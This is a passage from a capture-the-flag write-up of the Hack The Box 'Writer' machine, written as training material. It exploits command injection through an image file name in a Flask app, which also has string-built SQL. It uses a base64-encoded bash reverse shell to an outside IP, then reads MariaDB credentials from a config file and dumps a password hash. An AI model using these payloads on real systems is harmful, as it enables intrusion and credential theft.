class="string">&#x27;tagline&#x27;</span>)</span><br><span class="line">	content = request.form.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">	cursor = connector.cursor()</span><br><span class="line">	cursor.execute(<span class="string">&quot;UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s&quot;</span>, &#123;<span class="string">&#x27;title&#x27;</span>:title, <span class="string">&#x27;tagline&#x27;</span>:tagline, <span class="string">&#x27;content&#x27;</span>:content, <span class="string">&#x27;id&#x27;</span>: <span class="built_in">id</span>&#125;)</span><br><span class="line">	result = connector.commit()</span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;/dashboard/stories&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">	cursor = connector.cursor()</span><br><span class="line">	cursor.execute(<span class="string">&quot;SELECT * FROM stories where id = %(id)s;&quot;</span>, &#123;<span class="string">&#x27;id&#x27;</span>: <span class="built_in">id</span>&#125;)</span><br><span class="line">	results = cursor.fetchall()</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, results=results, <span class="built_in">id</span>=<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard/stories/delete/&lt;id&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_story</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session):</span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	connector = connections()</span><br><span class="line">    <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">	    <span class="keyword">return</span> (<span class="string">&quot;Database error&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">	cursor = connector.cursor()</span><br><span class="line">	cursor.execute(<span class="string">&quot;DELETE FROM stories WHERE id = %(id)s;&quot;</span>, &#123;<span class="string">&#x27;id&#x27;</span>: <span class="built_in">id</span>&#125;)</span><br><span class="line">	result = connector.commit()</span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;/dashboard/stories&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">	cursor = connector.cursor()</span><br><span class="line">	cursor.execute(<span class="string">&quot;SELECT * FROM stories where id = %(id)s;&quot;</span>, &#123;<span class="string">&#x27;id&#x27;</span>: <span class="built_in">id</span>&#125;)</span><br><span class="line">	results = cursor.fetchall()</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;delete.html&#x27;</span>, results=results, <span class="built_in">id</span>=<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Define user page for dashboard</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard/users&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">users</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session):</span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	connector = connections()</span><br><span class="line">    <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;Database Error&quot;</span></span><br><span class="line">    cursor = connector.cursor()</span><br><span class="line">    sql_command = <span class="string">&quot;SELECT * FROM users;&quot;</span></span><br><span class="line">    cursor.execute(sql_command)</span><br><span class="line">    results = cursor.fetchall()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;users.html&#x27;</span>, results=results)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Define settings page</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard/settings&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">settings</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session):</span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">	connector = connections()</span><br><span class="line">    <span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;Database Error!&quot;</span></span><br><span class="line">    cursor = connector.cursor()</span><br><span class="line">    sql_command = <span class="string">&quot;SELECT * FROM site WHERE id = 1&quot;</span></span><br><span class="line">    cursor.execute(sql_command)</span><br><span class="line">    results = cursor.fetchall()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;settings.html&#x27;</span>, results=results)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Define authentication mechanism</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/administrative&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_page</span>():</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session):</span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;/dashboard&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">	username = request.form.get(<span class="string">&#x27;uname&#x27;</span>)</span><br><span class="line">	password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">	password = hashlib.md5(password.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">	    connector = connections()</span><br><span class="line">	<span class="keyword">except</span> mysql.connector.Error <span class="keyword">as</span> err:</span><br><span class="line">	    <span class="keyword">return</span> (<span class="string">&quot;Database error&quot;</span>)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">	    cursor = connector.cursor()</span><br><span class="line">	    sql_command = <span class="string">&quot;Select * From users Where username = &#x27;%s&#x27; And password = &#x27;%s&#x27;&quot;</span> % (username, password)</span><br><span class="line">	    cursor.execute(sql_command)</span><br><span class="line">	    results = cursor.fetchall()</span><br><span class="line">	    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Got result&quot;</span>)</span><br><span class="line">	    <span class="keyword">if</span> result <span class="keyword">and</span> <span class="built_in">len</span>(result) != <span class="number">0</span>:</span><br><span class="line">		session[<span class="string">&#x27;user&#x27;</span>] = username</span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&#x27;success.html&#x27;</span>, results=results)</span><br><span class="line">	    <span class="keyword">else</span>:</span><br><span class="line">		error = <span class="string">&quot;Incorrect credentials supplied&quot;</span></span><br><span class="line">		<span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, error=error)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">	    error = <span class="string">&quot;Incorrect credentials supplied&quot;</span></span><br><span class="line">	    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, error=error)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> session):</span><br><span class="line">	<span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    session.pop(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   app.run(<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>WOAH it’s a long file so let’s just glaze through it and see if we can find something intresting.</p>
<p>Just looking at the imported library we can see that it is importing OS so that’s intresting so just look for the instance of OS only to see if we have code execution somewhere.</p>
<p>Looking for os.system which basically executes the bash commands we find this piece of code.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.form.get(<span class="string">&#x27;image_url&#x27;</span>):</span><br><span class="line">	    image_url = request.form.get(<span class="string">&#x27;image_url&#x27;</span>)</span><br><span class="line">	    <span class="keyword">if</span> <span class="string">&quot;.jpg&quot;</span> <span class="keyword">in</span> image_url:</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">		    local_filename, headers = urllib.request.urlretrieve(image_url)</span><br><span class="line">		    os.system(<span class="string">&quot;mv &#123;&#125; &#123;&#125;.jpg&quot;</span>.<span class="built_in">format</span>(local_filename, local_filename))</span><br><span class="line">		    image = <span class="string">&quot;&#123;&#125;.jpg&quot;</span>.<span class="built_in">format</span>(local_filename)</span><br><span class="line">		    <span class="keyword">try</span>:</span><br><span class="line">			im = Image.<span class="built_in">open</span>(image)</span><br><span class="line">			im.verify()</span><br><span class="line">			im.close()</span><br><span class="line">			image = image.replace(<span class="string">&#x27;/tmp/&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">			os.system(<span class="string">&quot;mv /tmp/&#123;&#125; /var/www/writer.htb/writer/static/img/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(image, image))</span><br><span class="line">			image = <span class="string">&quot;/img/&#123;&#125;&quot;</span>.<span class="built_in">format</span>(image)</span><br><span class="line">		    <span class="keyword">except</span> PIL.UnidentifiedImageError:</span><br><span class="line">			os.system(<span class="string">&quot;rm &#123;&#125;&quot;</span>.<span class="built_in">format</span>(image))</span><br><span class="line">			error = <span class="string">&quot;Not a valid image file!&quot;</span></span><br><span class="line">			<span class="keyword">return</span> render_template(<span class="string">&#x27;add.html&#x27;</span>, error=error)</span><br></pre></td></tr></table></figure>

<p>So looks like we have command injection in the name of the image as it is sending the filename directly to system command without sanatizing it but we have to be careful about the speacial chars so it doesn’t break the command in between so I will base64 encode it to be safe.</p>
<h2 id="Generating-file-with-malicious-name"><a href="#Generating-file-with-malicious-name" class="headerlink" title="Generating file with malicious name"></a>Generating file with malicious name</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/writer]</span><br><span class="line">└─<span class="comment"># echo -n &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.31/2233 0&gt;&amp;1&#x27;&quot; | base64                                                        </span></span><br><span class="line">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMS8yMjMzIDA+JjEn</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/writer]</span><br><span class="line">└─<span class="comment"># touch &#x27;1.jpg; `echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMS8yMjMzIDA+JjEn | base64 -d | bash `;&#x27;</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/writer]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line"><span class="string">&#x27;1.jpg; `echo YmFzaCAtYyAnYmFz&lt;---SNIP---&gt;= | base64 -d | bash `;&#x27;</span>   ffuf.log      me.jpg      nmap.nmap   sqlmap.log</span><br><span class="line"> enum4linux.log                                                                                             intial.nmap   nikto.log   r.txt       user.txt</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/writer]</span><br><span class="line">└─<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>Now that we have that file we have to upload it but before doing that start your nc listener.<br>So now pick any of exsisting story and edit it and change the image file with your image file.</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2060.jpg"></p>
</li>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2061.jpg"></p>
</li>
</ul>
<p>After you did that then you have to trigger that mv {} {} command by going to edit and changing the image url.<br>Now intercept the the edit of the same story with the burp.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2062.jpg"></li>
</ul>
<p>Now change the higlighted feild with the name of the malicious file.</p>
<p>But you have to give the local location of the filename so you know the base directory of the installation and from ffuf directorty fuzzing above we know that images are saved in &#x2F;static.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2063.jpg"></li>
</ul>
<p>and boom you can see our file so let’s write a local path for this file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///var/www/writer.htb/writer/static/img/1.jpg; `<span class="built_in">echo</span> YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMS8yMjMzIDA+JjEn | <span class="built_in">base64</span> -d | bash `;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>so let’s change this as image url and add ‘#’ sign at end so it ignores everything after our commands get executed.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2064.jpg"></li>
</ul>
<p>And boom we have the REVSHELL.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/writer]</span><br><span class="line">└─<span class="comment"># nc -lvp 2233</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::2233</span><br><span class="line">Ncat: Listening on 0.0.0.0:2233</span><br><span class="line">Ncat: Connection from 10.10.11.101.</span><br><span class="line">Ncat: Connection from 10.10.11.101:42662.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1061): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data@writer:/$ <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">www-data@writer:/$ </span><br><span class="line">www-data@writer:/$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<h1 id="Getting-user"><a href="#Getting-user" class="headerlink" title="Getting user"></a>Getting user</h1><h2 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>Looking for services just on localhost</p>
<h3 id="ss-tupln"><a href="#ss-tupln" class="headerlink" title="ss -tupln"></a>ss -tupln</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ss -tupln</span><br><span class="line">Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process                                                                         </span><br><span class="line">udp     UNCONN   0        0          127.0.0.53%lo:53            0.0.0.0:*                                                                                      </span><br><span class="line">udp     UNCONN   0        0           10.10.11.255:137           0.0.0.0:*                                                                                      </span><br><span class="line">udp     UNCONN   0        0           10.10.11.101:137           0.0.0.0:*                                                                                      </span><br><span class="line">udp     UNCONN   0        0                0.0.0.0:137           0.0.0.0:*                                                                                      </span><br><span class="line">udp     UNCONN   0        0           10.10.11.255:138           0.0.0.0:*                                                                                      </span><br><span class="line">udp     UNCONN   0        0           10.10.11.101:138           0.0.0.0:*                                                                                      </span><br><span class="line">udp     UNCONN   0        0                0.0.0.0:138           0.0.0.0:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        80             127.0.0.1:3306          0.0.0.0:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        50               0.0.0.0:139           0.0.0.0:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        10             127.0.0.1:8080          0.0.0.0:*       <span class="built_in">users</span>:((&quot;python3&quot;,pid=<span class="number">3262</span>,fd=<span class="number">4</span>))                                              </span><br><span class="line">tcp     LISTEN   0        4096       127.0.0.53%lo:53            0.0.0.0:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        100            127.0.0.1:25            0.0.0.0:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        50               0.0.0.0:445           0.0.0.0:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        50                  [::]:139              [::]:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        511                    *:80                  *:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        128                 [::]:22               [::]:*                                                                                      </span><br><span class="line">tcp     LISTEN   0        50                  [::]:445              [::]:*     </span><br></pre></td></tr></table></figure>

<p>So we have mysql db so let’s try to read it’s conf files.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">www-data@writer:$ <span class="built_in">cd</span> /etc/mysql</span><br><span class="line">www-data@writer:/etc/mysql$ <span class="built_in">ls</span></span><br><span class="line">conf.d</span><br><span class="line">debian-start</span><br><span class="line">debian.cnf</span><br><span class="line">mariadb.cnf</span><br><span class="line">mariadb.conf.d</span><br><span class="line">my.cnf</span><br><span class="line">my.cnf.fallback</span><br><span class="line">www-data@writer:/etc/mysql$ <span class="built_in">cat</span> mariadb.cnf</span><br><span class="line"><span class="comment"># The MariaDB configuration file</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The MariaDB/MySQL tools read configuration files in the following order:</span></span><br><span class="line"><span class="comment"># 1. &quot;/etc/mysql/mariadb.cnf&quot; (this file) to set global defaults,</span></span><br><span class="line"><span class="comment"># 2. &quot;/etc/mysql/conf.d/*.cnf&quot; to set global options.</span></span><br><span class="line"><span class="comment"># 3. &quot;/etc/mysql/mariadb.conf.d/*.cnf&quot; to set MariaDB-only options.</span></span><br><span class="line"><span class="comment"># 4. &quot;~/.my.cnf&quot; to set user-specific options.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># If the same option is defined multiple times, the last one will apply.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># One can use all long options that the program supports.</span></span><br><span class="line"><span class="comment"># Run program with --help to get a list of available options and with</span></span><br><span class="line"><span class="comment"># --print-defaults to see which it would actually understand and use.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This group is read both both by the client and the server</span></span><br><span class="line"><span class="comment"># use it for options that affect everything</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[client-server]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Import all .cnf files from configuration directory</span></span><br><span class="line">!includedir /etc/mysql/conf.d/</span><br><span class="line">!includedir /etc/mysql/mariadb.conf.d/</span><br><span class="line"></span><br><span class="line">[client]</span><br><span class="line">database = dev</span><br><span class="line">user = djangouser</span><br><span class="line">password = DjangoSuperPassword</span><br><span class="line">default-character-set = utf8</span><br></pre></td></tr></table></figure>

<p>we have username and password to login so let’s try that.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">www<span class="operator">-</span>data<span class="variable">@writer</span>:<span class="operator">/</span>etc<span class="operator">/</span>mysql$ mysql <span class="operator">-</span>u djangouser <span class="operator">-</span>h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>p </span><br><span class="line">DjangoSuperPassword</span><br><span class="line"></span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> names</span><br><span class="line">You can turn off this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker startup <span class="keyword">with</span> <span class="operator">-</span>A</span><br><span class="line"></span><br><span class="line">Welcome <span class="keyword">to</span> the MariaDB monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; <span class="keyword">or</span> \g.</span><br><span class="line">Your MariaDB connection id <span class="keyword">is</span> <span class="number">49</span></span><br><span class="line">Server version: <span class="number">10.3</span><span class="number">.29</span><span class="operator">-</span>MariaDB<span class="number">-0</span>ubuntu0<span class="number">.20</span><span class="number">.04</span><span class="number">.1</span> Ubuntu <span class="number">20.04</span></span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">2000</span>, <span class="number">2018</span>, Oracle, MariaDB Corporation Ab <span class="keyword">and</span> others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> help. Type <span class="string">&#x27;\c&#x27;</span> <span class="keyword">to</span> clear the <span class="keyword">current</span> input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [dev]<span class="operator">&gt;</span> <span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Database           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> dev                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [dev]<span class="operator">&gt;</span> use dev;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [dev]<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_dev              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="operator">|</span> auth_group                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> auth_group_permissions     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> auth_permission            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> auth_user                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> auth_user_groups           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> auth_user_user_permissions <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> django_admin_log           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> django_content_type        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> django_migrations          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> django_session             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------------------+</span></span><br><span class="line"><span class="number">10</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [dev]<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> auth_user;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> password                                                                                 <span class="operator">|</span> last_login <span class="operator">|</span> is_superuser <span class="operator">|</span> username <span class="operator">|</span> first_name <span class="operator">|</span> last_name <span class="operator">|</span> email           <span class="operator">|</span> is_staff <span class="operator">|</span> is_active <span class="operator">|</span> date_joined                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> pbkdf2_sha256$<span class="number">260000</span>$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A<span class="operator">=</span> <span class="operator">|</span> <span class="keyword">NULL</span>       <span class="operator">|</span>            <span class="number">1</span> <span class="operator">|</span> kyle     <span class="operator">|</span>            <span class="operator">|</span>           <span class="operator">|</span> kyle<span class="variable">@writer</span>.htb <span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> <span class="number">2021</span><span class="number">-05</span><span class="number">-19</span> <span class="number">12</span>:<span class="number">41</span>:<span class="number">37.168368</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>

<p>So we have kyle hash now let’s try to crack it.</p>
